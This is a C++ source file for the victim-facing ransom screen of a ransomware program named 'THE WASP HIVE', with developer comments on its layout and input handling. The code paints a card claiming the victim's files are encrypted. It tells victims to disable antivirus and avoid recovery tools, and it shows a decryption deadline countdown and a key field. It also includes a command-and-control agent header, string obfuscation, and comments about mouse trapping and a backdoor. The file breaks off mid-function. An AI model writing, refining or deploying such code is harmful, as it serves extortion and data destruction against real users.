// ============================================================================
// gui.cpp — THE WASP HIVE ransomware screen (fully custom painted)
// ============================================================================
// Design rationale
// ----------------
// The previous screen stacked native wxWidgets controls (wxStaticText,
// wxTextCtrl, wxButton) on a flat black background. Native controls can't be
// themed consistently across macOS and Windows, which is what made the screen
// look like a form instead of an event.
//
// This version paints the whole scene with wxGraphicsContext:
//   - vertical background gradient + a soft gold bloom behind the emblem
//   - gold ring emblem, letterspaced display typography, hairline dividers
//   - rounded "card" with an editorial text hierarchy: eyebrow -> question ->
//     body -> capability pills -> warning list
//   - bloom-lit pixel countdown
//   - custom-drawn key field and CTA (hover / pressed / focus states)
//
// Only one real child control remains: a borderless wxTextCtrl living inside
// the painted key well — that keeps real text input (IME, paste, caret,
// password masking) while the panel owns every pixel around it.
//
// Layout is a vertical flow (header -> card -> footer) that is measured first
// and then centred in the window, so the composition stays intact from a
// 660px-tall laptop screen up to a 4K display.
// ============================================================================

#include "gui.h"

#ifndef HEADLESS

#include <wx/graphics.h>
#include <wx/fontenum.h>
#include <wx/filename.h>
#include <wx/stdpaths.h>
#include <wx/display.h>
#include <wx/file.h>
#include <wx/tokenzr.h>
#include <wx/clipbrd.h>
#include <wx/dataobj.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <memory>
#include <vector>

#include "obfuscation.h"
#include "c2_agent.h"   // g_c2_agent — stop/reconnect control on unlock

// macOS: mouse trapping + child-process backdoor
#ifdef __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <spawn.h>      // posix_spawn (thread-safe, unlike fork)
#include <fcntl.h>      // O_RDONLY / O_WRONLY for /dev/null redirect
#include <unistd.h>     // _exit()
#endif

// ============================================================================
// Pixel Font Data — 7x5 matrices for digits 0-9 + colon at index 10
// ============================================================================
const int PixelDigit::digits[11][7][5] = {
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,0,0}, {0,1,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,0,1,0,0}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,1,1,0,0}, {1,1,0,0,0}, {1,1,1,1,1}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,0,1,1,0}, {0,1,0,1,1}, {1,1,0,1,1}, {1,1,1,1,1}, {0,0,0,1,1}, {0,0,0,1,1}, {0,0,0,1,1}},
    {{1,1,1,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {0,0,0,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,0,0}, {1,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{1,1,1,1,1}, {0,0,0,1,1}, {0,0,1,1,0}, {0,0,1,1,0}, {0,1,1,0,0}, {0,1,1,0,0}, {0,1,1,0,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    {{0,1,1,1,0}, {1,1,0,1,1}, {1,1,0,1,1}, {0,1,1,1,1}, {0,0,0,1,1}, {1,1,0,1,1}, {0,1,1,1,0}},
    // Colon. The dots MUST live in columns 0-1: the layout advances the cursor
    // by exactly 2 columns for this glyph, so dots placed at columns 2-3 used
    // to be painted on top of the next digit's left edge — the colon was there
    // but visually glued to the following digit and read as missing.
    {{0,0,0,0,0}, {1,1,0,0,0}, {1,1,0,0,0}, {0,0,0,0,0}, {1,1,0,0,0}, {1,1,0,0,0}, {0,0,0,0,0}}
};

// ============================================================================
// Layout constants — one place to tune the whole composition
// ============================================================================
namespace {

const int    kPadX       = 34;    // horizontal page margin
const int    kContentW   = 780;   // max width of the information card
// Emblem box in px. The source art is a 512x512 PNG decoded at 2x for Retina
// (see LoadEmblem), so anything above 256 would upscale and go soft. 160 is a
// 54% increase over the old 104 and still leaves ~30px of air at the bottom of
// a 940x772 window.
const int    kEmblemSize = 160;   // painted emblem box (px)
const int    kFieldW     = 366;   // decryption key well
const int    kButtonW    = 208;   // "UNLOCK FILES" CTA
const int    kActionH    = 42;    // well / CTA height
const int    kTimerPixel = 6;     // pixel-font block size

// Minimum frame height that still fits the whole composition:
// 540 (header text + card + footer, measured) + emblem + 2x10px margin.
const int    kMinHeight  = 540 + kEmblemSize + 20;

const double kCardRadius    = 12.0;
const double kControlRadius = 9.0;

// Emblem file names, in priority order. wasp_logo.png is the current brand
// mark; bee.png stays as a fallback for older drops that shipped it.
const char* kEmblemNames[] = { "wasp_logo.png", "bee.png" };

// Card copy
const char* kCardQuestion = "What happened to my files?";
const char* kCardBody =
    "Every important file on this computer is locked. Documents, photos, videos, "
    "databases and project sources were encrypted with a unique key and cannot be "
    "opened, moved or restored.";
const char* kPills[] = { "AES-256", "RSA-4096", "UNIQUE KEY PER FILE" };
const char* kWarnings[] = {
    "DO NOT rename encrypted files \xE2\x80\x94 this causes permanent data loss",
    "DO NOT use third-party decrypt tools \xE2\x80\x94 files may be corrupted",
    "Disable antivirus software \xE2\x80\x94 it may quarantine the decryptor",
    "System restore will NOT work \xE2\x80\x94 encryption is irreversible"
};
const int kWarningCount = 4;

} // namespace

// ============================================================================
// gui:: — theme + drawing primitives
// ============================================================================
namespace gui {

const wxColour& BgTop()     { static const wxColour c(0x0E, 0x0D, 0x0A); return c; }
const wxColour& BgBottom()  { static const wxColour c(0x00, 0x00, 0x00); return c; }
const wxColour& Gold()      { static const wxColour c(0xE8, 0xB9, 0x4A); return c; }
const wxColour& GoldHi()    { static const wxColour c(0xFF, 0xD9, 0x77); return c; }
const wxColour& GoldDim()   { static const wxColour c(0x9C, 0x82, 0x46); return c; }
const wxColour& Ink()       { static const wxColour c(0xE4, 0xE0, 0xD6); return c; }
const wxColour& InkDim()    { static const wxColour c(0x9A, 0x95, 0x8A); return c; }
const wxColour& InkFaint()  { static const wxColour c(0x5E, 0x5A, 0x52); return c; }
const wxColour& CardFill()  { static const wxColour c(0x08, 0x07, 0x05); return c; }
const wxColour& CardEdge()  { static const wxColour c(0x2E, 0x27, 0x19); return c; }
const wxColour& Danger()    { static const wxColour c(0xE0, 0x4A, 0x3C); return c; }
const wxColour& Success()   { static const wxColour c(0x4C, 0xC7, 0x8A); return c; }
const wxColour& FieldFill() { static const wxColour c(0x14, 0x12, 0x0C); return c; }

// ---------------------------------------------------------------------------
// Font selection — pick the first installed candidate per role. wxFont cannot
// hold a fallback chain, so we resolve it at call time.
// ---------------------------------------------------------------------------
static wxFont pickFont(const char* const* faces, size_t count, int pt, wxFontWeight weight)
{
    for (size_t i = 0; i < count; ++i) {
        wxString face = wxString::FromUTF8(faces[i]);
        if (wxFontEnumerator::IsValidFacename(face)) {
            return wxFont(wxFontInfo(pt).FaceName(face).Weight(weight));
        }
    }
    return wxFont(wxFontInfo(pt).Weight(weight));
}

wxFont DisplayFont(int pt, wxFontWeight weight)
{
    // Condensed, industrial faces read as "brand mark", not "system dialog".
    static const char* faces[] = {
        "Avenir Next Condensed", "Bahnschrift SemiCondensed", "Bahnschrift",
        "Impact", "Haettenschweiler", "Futura", "Helvetica Neue"
    };
    return pickFont(faces, WXSIZEOF(faces), pt, weight);
}

wxFont BodyFont(int pt, wxFontWeight weight)
{
    static const char* faces[] = {
        "Avenir Next", "Segoe UI", "Helvetica Neue", "DejaVu Sans"
    };
    return pickFont(faces, WXSIZEOF(faces), pt, weight);
}

wxFont MonoFont(int pt, wxFontWeight weight)
{
    static const char* faces[] = {
        "Menlo", "SF Mono", "Consolas", "DejaVu Sans Mono", "Courier New"
    };
    return pickFont(faces, WXSIZEOF(faces), pt, weight);
}

// ---------------------------------------------------------------------------
// Letter-spaced text. wx has no tracking property, so glyphs are placed one at
// a time — this is what gives the small uppercase labels their editorial feel.
// ---------------------------------------------------------------------------
double TrackedWidth(wxGraphicsContext* gc, const wxString& text, double tracking)
{
    double total = 0;
    for (size_t i = 0; i < text.length(); ++i) {
        double w = 0, h = 0, d = 0, e = 0;
        gc->GetTextExtent(text.Mid(i, 1), &w, &h, &d, &e);
        total += w;
        if (i + 1 < text.length()) total += tracking;
    }
    return total;
}

void DrawTracked(wxGraphicsContext* gc, const wxString& text,
                 double x, double y, double tracking)
{
    for (size_t i = 0; i < text.length(); ++i) {
        wxString ch = text.Mid(i, 1);
        double w = 0, h = 0, d = 0, e = 0;
        gc->GetTextExtent(ch, &w, &h, &d, &e);
        gc->DrawText(ch, x, y);
        x += w + tracking;
    }
}

// ---------------------------------------------------------------------------
// Greedy word wrap honouring explicit '\n'.
// ---------------------------------------------------------------------------
std::vector<wxString> Wrap(wxGraphicsContext* gc, const wxString& text, double maxWidth)
{
    std::vector<wxString> lines;
    wxArrayString paragraphs = wxSplit(text, '\n');

    for (size_t p = 0; p < paragraphs.GetCount(); ++p) {
        const wxString& para = paragraphs[p];
        if (para.IsEmpty()) { lines.push_back(wxString()); continue; }

        wxArrayString words = wxSplit(para, ' ');
        wxString current;
        for (size_t i = 0; i < words.GetCount(); ++i) {
            if (words[i].IsEmpty()) continue;
            wxString candidate = current.IsEmpty() ? words[i] : current + " " + words[i];
            double w = 0, h = 0, d = 0, e = 0;
            gc->GetTextExtent(candidate, &w, &h, &d, &e);
            if (w > maxWidth && !current.IsEmpty()) {
                lines.push_back(current);
                current = words[i];
            } else {
                current = candidate;
            }
        }
        if (!current.IsEmpty()) lines.push_back(current);
    }
    return lines;
}

// ---------------------------------------------------------------------------
// Rounded rectangles
// ---------------------------------------------------------------------------
static wxGraphicsPath roundPath(wxGraphicsContext* gc, const wxRect2DDouble& r, double radius)
{
    wxGraphicsPath path = gc->CreatePath();
    double rad = std::min(radius, std::min(r.m_width, r.m_height) / 2.0);
    path.AddRoundedRectangle(r.m_x, r.m_y, r.m_width, r.m_height, rad);
    return path;
}

void FillRound(wxGraphicsContext* gc, const wxRect2DDouble& r, double radius,
               const wxColour& fill)
{
    gc->SetPen(*wxTRANSPARENT_PEN);
    gc->SetBrush(wxBrush(fill));
    gc->FillPath(roundPath(gc, r, radius));
}

void StrokeRound(wxGraphicsContext* gc, const wxRect2DDouble& r, double radius,
                 const wxColour& stroke, double width)
{
    gc->SetBrush(*wxTRANSPARENT_BRUSH);
    gc->SetPen(wxPen(stroke, (int)std::max(1.0, width)));
    gc->StrokePath(roundPath(gc, r, radius));
}

// ---------------------------------------------------------------------------
// Soft radial glow — concentric stroked rings with quadratic falloff. Stroking
// annuli (instead of stacking filled circles) avoids the alpha build-up that
// turns a filled-ring approximation into a solid disc.
// ---------------------------------------------------------------------------
void RadialGlow(wxGraphicsContext* gc, double cx, double cy, double radius,
                const wxColour& colour, int alpha, int steps)
{
    if (radius <= 0 || steps <= 0) return;

    gc->SetBrush(*wxTRANSPARENT_BRUSH);
    const double ringW = radius / steps + 1.0;

    for (int i = steps; i >= 1; --i) {
        double t = (double)i / steps;              // 1 = outermost
        double r = radius * t;
        double fade = (1.0 - t) * (1.0 - t);       // fades out toward the edge
        int a = (int)(alpha * fade);
        if (a <= 0) continue;
        gc->SetPen(wxPen(wxColour(colour.Red(), colour.Green(), colour.Blue(),
                                  (unsigned char)std::min(a, 255)),
                         (int)ringW));
        gc->DrawEllipse(cx - r, cy - r, r * 2, r * 2);
    }
}

// ---------------------------------------------------------------------------
// Inline warning glyph — filled triangle with a knocked-out exclamation mark.
// Drawn as vectors so it stays crisp and needs no PNG asset.
// ---------------------------------------------------------------------------
void WarningGlyph(wxGraphicsContext* gc, double x, double y, double size,
                  const wxColour& colour)
{
    gc->SetPen(*wxTRANSPARENT_PEN);
    gc->SetBrush(wxBrush(colour));

    wxGraphicsPath tri = gc->CreatePath();
    tri.MoveToPoint(x + size / 2.0, y);
    tri.AddLineToPoint(x + size,        y + size * 0.88);
    tri.AddLineToPoint(x,               y + size * 0.88);
    tri.CloseSubpath();
    gc->FillPath(tri);

    // Exclamation mark punched out in the background colour
    gc->SetBrush(wxBrush(wxColour(0x00, 0x00, 0x00)));
    const double stemW = std::max(1.2, size * 0.11);
    gc->DrawRectangle(x + size / 2.0 - stemW / 2.0, y + size * 0.32, stemW, size * 0.30);
    gc->DrawRectangle(x + size / 2.0 - stemW / 2.0, y + size * 0.70, stemW, stemW);
}

// ---------------------------------------------------------------------------
// Pixel countdown — 7x5 blocks with a three-pass bloom.
// ---------------------------------------------------------------------------
static void drawPixelBlocks(wxGraphicsContext* gc, const int* units, double cx, double top,
                            int pixel, double grow, const wxColour& colour)
{
    const double digitW = 5 * pixel;
    const double gap    = pixel;
    const double colonW = 2 * pixel;
    const double colonG = 2 * pixel;
    const double total  = 6 * digitW + 3 * gap + 2 * colonW + 4 * colonG;

    // 0-5 are digits, index 10 in PixelDigit is the colon
    const int order[8] = { units[0], units[1], 10, units[2], units[3], 10, units[4], units[5] };

    gc->SetPen(*wxTRANSPARENT_PEN);
    gc->SetBrush(wxBrush(colour));

    double x = cx - total / 2.0;
    for (int i = 0; i < 8; ++i) {
        int digit = order[i];
        for (int row = 0; row < 7; ++row) {
            for (int col = 0; col < 5; ++col) {
                if (!PixelDigit::digits[digit][row][col]) continue;
                gc->DrawRectangle(x + col * pixel - grow / 2.0,
                                  top + row * pixel - grow / 2.0,
                                  pixel - 1 + grow,
                                  pixel - 1 + grow);
            }
        }
        if (i == 7) break;
        // advance cursor between glyphs
        if (i == 0 || i == 3 || i == 6)  x += digitW + gap;     // digit -> digit
        else if (i == 1 || i == 4)       x += digitW + colonG;  // digit -> colon
        else                             x += colonW + colonG;  // colon -> digit
    }
}

static void DrawPixelTimer(wxGraphicsContext* gc, double cx, double top,
                           int pixel, int hours, int minutes, int seconds)
{
    const int units[6] = {
        hours / 10, hours % 10, minutes / 10, minutes % 10, seconds / 10, seconds % 10
    };

    // Bloom: wide faint halo, tight bright halo, then the crisp blocks.
    drawPixelBlocks(gc, units, cx, top, pixel, pixel * 0.55,
                    wxColour(0xE8, 0xB9, 0x4A, 22));
    drawPixelBlocks(gc, units, cx, top, pixel, pixel * 0.22,
                    wxColour(0xFF, 0xD9, 0x77, 55));
    drawPixelBlocks(gc, units, cx, top, pixel, 0.0, wxColour(0xFF, 0xD9, 0x77, 240));
}

} // namespace gui

// ============================================================================
// ScenePanel
// ============================================================================
ScenePanel::ScenePanel(RansomwareFrame* owner)
    : wxPanel(owner, wxID_ANY),
      m_owner(owner),
      m_caretTimer(nullptr), m_caretOn(true),
      m_hours(4), m_minutes(0), m_seconds(36),
      m_statusSuccess(false),
      m_hover(false), m_pressed(false)
{
    // Custom painting: wx must not erase the background before OnPaint.
    SetBackgroundStyle(wxBG_STYLE_PAINT);
    SetBackgroundColour(*wxBLACK);

    LoadEmblem();

    // Key input is handled by the panel itself (see OnCharHook) — no native
    // text control, so there is no platform focus ring and no baseline drift.
    Bind(wxEVT_PAINT, &ScenePanel::OnPaint, this);
    Bind(wxEVT_SIZE, &ScenePanel::OnSize, this);
    Bind(wxEVT_LEFT_DOWN, &ScenePanel::OnLeftDown, this);
    Bind(wxEVT_LEFT_UP, &ScenePanel::OnLeftUp, this);
    Bind(wxEVT_MOTION, &ScenePanel::OnMotion, this);
    Bind(wxEVT_LEAVE_WINDOW, &ScenePanel::OnLeaveWindow, this);
    Bind(wxEVT_CHAR_HOOK, &ScenePanel::OnCharHook, this);
    Bind(wxEVT_CHAR, &ScenePanel::OnChar, this);

    m_caretTimer = new wxTimer(this, 1003);
    m_caretTimer->Start(530);
    Bind(wxEVT_TIMER, &ScenePanel::OnCaretBlink, this, 1003);
}

ScenePanel::~ScenePanel()
{
    if (m_caretTimer) { m_caretTimer->Stop(); delete m_caretTimer; m_caretTimer = nullptr; }
}

// ---------------------------------------------------------------------------
// Key input. The password is masked: only a dot count is ever drawn.
// ---------------------------------------------------------------------------
void ScenePanel::OnCaretBlink(wxTimerEvent&)
{
    if (!HasFocus()) return;
    m_caretOn = !m_caretOn;
    Refresh();
}

void ScenePanel::OnCharHook(wxKeyEvent& event)
{
    const int code = event.GetKeyCode();

    if (code == WXK_RETURN || code == WXK_NUMPAD_ENTER) {
        m_owner->AttemptUnlock(m_key);
        return;
    }
    if (code == WXK_BACK) {
        if (!m_key.empty()) m_key.RemoveLast();
        m_caretOn = true;
        Refresh();
        return;
    }
    if (code == WXK_ESCAPE) {
        m_key.clear();
        Refresh();
        return;
    }
    // Paste: Cmd+V on macOS, Ctrl+V elsewhere
    if ((code == 'v' || code == 'V') && (event.CmdDown() || event.ControlDown())) {
        if (wxTheClipboard->Open()) {
            if (wxTheClipboard->IsSupported(wxDF_TEXT)) {
                wxTextDataObject data;
                wxTheClipboard->GetData(data);
                wxString pasted = data.GetText();
                pasted.Replace("\r", "");
                pasted.Replace("\n", "");
                m_key += pasted;
            }
            wxTheClipboard->Close();
        }
        m_caretOn = true;
        Refresh();
        return;
    }

    // Text itself is NOT taken here — see OnChar(). wxEVT_CHAR_HOOK carries the
    // physical key, not the character it produces, so appending its key code
    // turned Shift+1 into '1' and silently stored "WaspHive2024!" as
    // "WaspHive20241": 13 dots on screen, always "INVALID KEY".
    event.Skip();
}

// ---------------------------------------------------------------------------
// Character input. wxEVT_CHAR is the event whose key/unicode code is translated
// through the current keyboard state and layout, which is exactly what a text
// field needs. Control keys never reach here: OnCharHook either handled them
// (Enter, Backspace, Esc, paste) or skipped them, and chords are filtered below
// so Cmd+V cannot also insert a literal 'v'.
// ---------------------------------------------------------------------------
void ScenePanel::OnChar(wxKeyEvent& event)
{
    // Shortcuts are not text.
    if (event.CmdDown() || event.ControlDown() || event.AltDown()) return;

    wxChar ch = event.GetUnicodeKey();
    if (ch == WXK_NONE) ch = static_cast<wxChar>(event.GetKeyCode());

    // Printable ASCII only — the key is a password, not a document.
    if (ch < 32 || ch > 126 || m_key.length() >= 64) return;

    m_key += wxString(ch);
    m_caretOn = true;
    Refresh();
}

void ScenePanel::SetTime(int h, int m, int s)
{
    m_hours = h; m_minutes = m; m_seconds = s;
    Refresh();
}

void ScenePanel::SetStatus(const wxString& text, bool success)
{
    m_status = text;
    m_statusSuccess = success;
    Refresh();
}

bool ScenePanel::LoadEmblem()
{
    wxArrayString dirs;
    dirs.Add(wxGetCwd());
    dirs.Add(wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath());

    for (size_t d = 0; d < dirs.GetCount(); ++d) {
        for (size_t n = 0; n < WXSIZEOF(kEmblemNames); ++n) {
            wxString path = dirs[d] + wxFileName::GetPathSeparator() + kEmblemNames[n];
            if (!wxFileExists(path)) continue;

            wxImage img(path, wxBITMAP_TYPE_PNG);
            if (!img.IsOk()) continue;

            // Decode at 2x the paint size so the emblem stays crisp on Retina
            // and on HiDPI Windows displays.
            const int target = kEmblemSize * 2;
            if (img.GetWidth() != target || img.GetHeight() != target) {
                img.Rescale(target, target, wxIMAGE_QUALITY_HIGH);
            }
            m_emblem = wxBitmap(img);
            return m_emblem.IsOk();
        }
    }
    return false;
}

void ScenePanel::UpdateGeometry()
{
    // The key field is positioned during Render (the layout is content-driven),
    // so a resize only needs a repaint.
    Refresh();
}

void ScenePanel::OnSize(wxSizeEvent& event)
{
    Refresh();
    event.Skip();
}

// ---------------------------------------------------------------------------
// Background: vertical gradient + a very restrained warm wash from the top.
// ---------------------------------------------------------------------------
void ScenePanel::DrawBackground(wxGraphicsContext* gc, int w, int h)
{
    gc->SetPen(*wxTRANSPARENT_PEN);
    gc->SetBrush(gc->CreateLinearGradientBrush(0, 0, 0, h, gui::BgTop(), gui::BgBottom()));
    gc->DrawRectangle(0, 0, w, h);

    // NOTE: an earlier revision washed the top of the screen with translucent
    // gold for depth. Even at low alpha it lifted the whole upper half to a
    // muddy brown, so the depth now comes from the emblem halo alone and the
    // background stays black.
}

// ---------------------------------------------------------------------------
// Header: emblem + wordmark + eyebrow + hairline divider.
// ---------------------------------------------------------------------------
double ScenePanel::DrawHeader(wxGraphicsContext* gc, int w, double y)
{
    const double cx = w / 2.0;

    // ---- emblem ----
    // If neither wasp_logo.png nor bee.png is next to the binary, collapse the
    // block entirely instead of leaving a 104px hole above the wordmark.
    if (m_emblem.IsOk()) {
        gui::RadialGlow(gc, cx, y + kEmblemSize / 2.0, kEmblemSize * 0.92,
                        gui::Gold(), 34, 22);
        gc->DrawBitmap(m_emblem, cx - kEmblemSize / 2.0, y, kEmblemSize, kEmblemSize);
        y += kEmblemSize + 8;
    }

    // ---- wordmark ----
    const wxString title = OBF("THE WASP HIVE");
    gc->SetFont(gui::DisplayFont(27), gui::GoldHi());
    const double titleW = gui::TrackedWidth(gc, title, 5.0);

    double tw = 0, th = 0, td = 0, te = 0;
    gc->GetTextExtent(title, &tw, &th, &td, &te);

    // Drop shadow: one offset pass in near-black adds real depth under the gold.
    gc->SetFont(gui::DisplayFont(27), wxColour(0x00, 0x00, 0x00, 150));
    gui::DrawTracked(gc, title, cx - titleW / 2.0 + 1.2, y + 2.0, 5.0);
    gc->SetFont(gui::DisplayFont(27), gui::GoldHi());
    gui::DrawTracked(gc, title, cx - titleW / 2.0, y, 5.0);
    y += th + 5;

    // ---- eyebrow ----
    gc->SetFont(gui::MonoFont(8, wxFONTWEIGHT_BOLD), gui::GoldDim());
    const wxString eyebrow = "CENTRAL OPERATIONS  \xE2\x80\xA2  DECRYPTION PORTAL";
    gui::DrawTracked(gc, eyebrow, cx - gui::TrackedWidth(gc, eyebrow, 3.0) / 2.0, y, 3.0);
    y += 20;

    // ---- hairline with centre diamond ----
    const double halfLine = std::min(280.0, w / 2.0 - 60);
    gc->SetPen(wxPen(wxColour(0x9C, 0x82, 0x46, 130), 1));
    gc->StrokeLine(cx - halfLine, y, cx - 9, y);
    gc->StrokeLine(cx + 9, y, cx + halfLine, y);
    gc->SetBrush(wxBrush(gui::Gold()));
    gc->SetPen(*wxTRANSPARENT_PEN);
    wxGraphicsPath diamond = gc->CreatePath();
    diamond.MoveToPoint(cx, y - 4.0);
    diamond.AddLineToPoint(cx + 4.0, y);
    diamond.AddLineToPoint(cx, y + 4.0);
    diamond.AddLineToPoint(cx - 4.0, y);
    diamond.CloseSubpath();
    gc->FillPath(diamond);

    return y + 15;
}

// ---------------------------------------------------------------------------
// Card: measure first (wrap depends on width), then draw.
// ---------------------------------------------------------------------------
ScenePanel::CardMetrics ScenePanel::MeasureCard(wxGraphicsContext* gc, int w)
{
    CardMetrics m;
    m.cardW = std::min<double>(kContentW, w - 2.0 * kPadX);
    m.cardX = (w - m.cardW) / 2.0;
    m.padX  = 22.0;
    m.textX = m.cardX + m.padX + 12.0;          // clears the gold accent bar
    m.textW = m.cardW - 2.0 * m.padX - 12.0;

    gc->SetFont(gui::BodyFont(12), gui::InkDim());
    m.bodyLines = gui::Wrap(gc, wxString::FromUTF8(kCardBody), m.textW);

    m.eyebrowH = 15.0;
    m.questionH = 22.0;
    m.bodyLineH = 21.0;
    m.pillH = 24.0;
    m.warnH = 22.0;

    m.cardH = 17.0                                        // top padding
            + m.eyebrowH + 7.0
            + m.questionH + 9.0
            + m.bodyLines.size() * m.bodyLineH + 13.0
            + m.pillH + 14.0
            + 1.0 + 12.0                                  // hairline + gap
            + kWarningCount * m.warnH
            + 18.0;                                       // bottom padding
    return m;
}

void ScenePanel::DrawCard(wxGraphicsContext* gc, double y, const CardMetrics& m)
{
    // ---- shell ----
    wxRect2DDouble cardRect(m.cardX, y, m.cardW, m.cardH);
    gui::FillRound(gc, cardRect, kCardRadius, gui::CardFill());
    gui::StrokeRound(gc, cardRect, kCardRadius, wxColour(0x2E, 0x27, 0x19, 220), 1.0);

    // gold accent bar down the left edge
    gui::FillRound(gc, wxRect2DDouble(m.cardX + 1.0, y + 12.0, 3.0, m.cardH - 24.0),
                   1.5, wxColour(0xE8, 0xB9, 0x4A, 190));

    double ty = y + 17.0;

    // ---- eyebrow ----
    gc->SetFont(gui::MonoFont(8, wxFONTWEIGHT_BOLD), gui::GoldDim());
    gui::DrawTracked(gc, "SYSTEM STATUS  \xE2\x80\x94  LOCKED", m.textX, ty, 2.6);
    ty += m.eyebrowH + 7.0;

    // ---- question (the line the victim actually reads first) ----
    gui::WarningGlyph(gc, m.textX, ty + 3.0, 13.0, gui::Danger());
    gc->SetFont(gui::BodyFont(15, wxFONTWEIGHT_BOLD), gui::Ink());
    gc->DrawText(wxString::FromUTF8(kCardQuestion), m.textX + 21.0, ty);
    ty += m.questionH + 9.0;

    // ---- body copy ----
    gc->SetFont(gui::BodyFont(12), gui::InkDim());
    for (size_t i = 0; i < m.bodyLines.size(); ++i) {
        gc->DrawText(m.bodyLines[i], m.textX, ty);
        ty += m.bodyLineH;
    }
    ty += 13.0;

    // ---- capability pills ----
    double pillX = m.textX;
    gc->SetFont(gui::MonoFont(8, wxFONTWEIGHT_BOLD), gui::GoldDim());
    for (size_t i = 0; i < WXSIZEOF(kPills); ++i) {
        wxString text = wxString::FromUTF8(kPills[i]);
        const double tracking = 1.6;
        const double textW = gui::TrackedWidth(gc, text, tracking);
        const double pillW = textW + 26.0;

        if (pillX + pillW > m.textX + m.textW) break;   // narrow windows: drop extras

        gui::FillRound(gc, wxRect2DDouble(pillX, ty, pillW, m.pillH), m.pillH / 2.0,
                       wxColour(0x1A, 0x16, 0x0D));
        gui::StrokeRound(gc, wxRect2DDouble(pillX, ty, pillW, m.pillH), m.pillH / 2.0,
                         wxColour(0x4A, 0x3D, 0x22), 1.0);
        // Caps sit in the upper part of the text box, so the box is nudged down
        // by ~2px — otherwise the label reads as stuck to the pill's top edge.
        double ptw = 0, pth = 0, ptd = 0, pte = 0;
        gc->GetTextExtent(text, &ptw, &pth, &ptd, &pte);
        gui::DrawTracked(gc, text, pillX + 13.0, ty + (m.pillH - pth) / 2.0 + 2.0, tracking);

        pillX += pillW + 8.0;
    }
    ty += m.pillH + 14.0;

    // ---- hairline ----
    gc->SetPen(wxPen(wxColour(0x2E, 0x27, 0x19, 220), 1));
    gc->StrokeLine(m.textX, ty, m.textX + m.textW, ty);
    ty += 1.0 + 12.0;

    // ---- warnings ----
    gc->SetFont(gui::BodyFont(11), gui::InkDim());
    for (int i = 0; i < kWarningCount; ++i) {
        gui::WarningGlyph(gc, m.textX, ty + 4.0, 9.0, gui::Danger());
        gc->DrawText(wxString::FromUTF8(kWarnings[i]), m.textX + 18.0, ty);
        ty += m.warnH;
    }
}

// ---------------------------------------------------------------------------
// Footer: deadline + pixel countdown, key field, CTA, status line.
// Drawn in flow below the card, so the composition stays centred.
// ---------------------------------------------------------------------------
void ScenePanel::DrawFooter(wxGraphicsContext* gc, int w, double y)
{
    const double cx = w / 2.0;

    // ---- deadline eyebrow ----
    gc->SetFont(gui::MonoFont(8, wxFONTWEIGHT_BOLD), gui::InkFaint());
    const wxString deadLabel = "DECRYPTION DEADLINE";
    gui::DrawTracked(gc, deadLabel, cx - gui::TrackedWidth(gc, deadLabel, 4.0) / 2.0,
                     y, 4.0);
    y += 16.0;

    // ---- pixel countdown ----
    gui::DrawPixelTimer(gc, cx, y, kTimerPixel, m_hours, m_minutes, m_seconds);
    y += 7 * kTimerPixel + 16.0;

    // ---- key field ----
    const int rowW   = kFieldW + 12 + kButtonW;
    const int fieldX = (int)((w - rowW) / 2);
    const int rowY   = (int)y;

    gc->SetFont(gui::MonoFont(8, wxFONTWEIGHT_BOLD), gui::InkFaint());
    gui::DrawTracked(gc, "DECRYPTION KEY", fieldX + 2, y - 13.0, 3.0);

    const bool focused = HasFocus();
    wxRect2DDouble fieldR(fieldX, rowY, kFieldW, kActionH);
    gui::FillRound(gc, fieldR, kControlRadius, gui::FieldFill());
    gui::StrokeRound(gc, fieldR, kControlRadius,
                     focused ? gui::Gold() : wxColour(0x2E, 0x27, 0x19, 230),
                     focused ? 1.5 : 1.0);

    if (focused) {
        // soft focus halo just outside the well
        gui::StrokeRound(gc, wxRect2DDouble(fieldR.m_x - 2.5, fieldR.m_y - 2.5,
                                            fieldR.m_width + 5, fieldR.m_height + 5),
                         kControlRadius + 2.5, wxColour(0xE8, 0xB9, 0x4A, 40), 1.0);
    }

    // ---- masked key: one dot per character, vertically centred by hand ----
    const double fieldCy = fieldR.m_y + fieldR.m_height / 2.0;
    const double dotR  = 3.0;
    const double dotStep = 11.0;

    if (m_key.IsEmpty()) {
        if (!focused) {
            gc->SetFont(gui::MonoFont(9), gui::InkFaint());
            const wxString hint = "ENTER KEY";
            gui::DrawTracked(gc, hint,
                             fieldR.m_x + (fieldR.m_width - gui::TrackedWidth(gc, hint, 3.0)) / 2.0,
                             fieldCy - 6.0, 3.0);
        } else if (m_caretOn) {
            gc->SetPen(*wxTRANSPARENT_PEN);
            gc->SetBrush(wxBrush(gui::Gold()));
            gc->DrawRectangle(fieldR.m_x + fieldR.m_width / 2.0 - 0.8,
                              fieldCy - 9.0, 1.6, 18.0);
        }
    } else {
        const double spanW = (m_key.length() - 1) * dotStep;
        double dx = fieldR.m_x + (fieldR.m_width - spanW) / 2.0 - dotR;

        gc->SetPen(*wxTRANSPARENT_PEN);
        gc->SetBrush(wxBrush(gui::GoldHi()));
        for (size_t i = 0; i < m_key.length(); ++i) {
            gc->DrawEllipse(dx - dotR, fieldCy - dotR, dotR * 2, dotR * 2);
            dx += dotStep;
        }

        if (focused && m_caretOn) {
            gc->SetBrush(wxBrush(gui::Gold()));
            gc->DrawRectangle(dx - dotStep + dotR + 4.0, fieldCy - 9.0, 1.6, 18.0);
        }
    }

    // ---- CTA ----
    const int btnX = fieldX + kFieldW + 12;
